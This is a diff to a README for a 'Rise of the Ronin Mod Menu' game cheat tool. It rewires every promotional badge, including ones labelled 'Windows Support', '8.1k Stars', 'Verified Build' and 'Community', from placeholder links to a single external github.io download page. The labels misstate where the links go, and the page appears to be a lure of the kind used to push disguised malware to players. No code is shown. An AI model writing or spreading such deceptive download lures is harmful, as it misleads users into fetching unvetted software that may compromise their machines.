@@ -22,10 +22,10 @@ The Mod Menu acts as an **in-game hub** for enhancements. Whether you want a smo
 
 ---
 
-[![Activate Mods](https://img.shields.io/badge/Activate-Mods-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 8.1k Stars](https://img.shields.io/badge/Community-8.1k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download Menu](https://img.shields.io/badge/Download-Now-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Mods](https://img.shields.io/badge/Activate-Mods-red?logo=rocket\&style=for-the-badge)](https://rise-of-the-ronin-mods-menu.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://rise-of-the-ronin-mods-menu.github.io/.github/)
+[![⭐️ 8.1k Stars](https://img.shields.io/badge/Community-8.1k_Stars-green?logo=github\&style=for-the-badge)](https://rise-of-the-ronin-mods-menu.github.io/.github/)
+[![Download Menu](https://img.shields.io/badge/Download-Now-brightgreen?logo=github\&style=for-the-badge)](https://rise-of-the-ronin-mods-menu.github.io/.github/)
 
 ---
 
@@ -154,8 +154,8 @@ A: No, it’s optimized to run with minimal system load.
 
 The **Rise of the Ronin Mod Menu** delivers **combat tweaks, farming boosts, and visual customization** in one user-friendly package. Whether you’re mastering sword duels, farming resources, or exploring the open world, it lets you tailor the game to your perfect experience.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download Mods](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://rise-of-the-ronin-mods-menu.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://rise-of-the-ronin-mods-menu.github.io/.github/)
+[![Download Mods](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://rise-of-the-ronin-mods-menu.github.io/.github/)
 
 ---
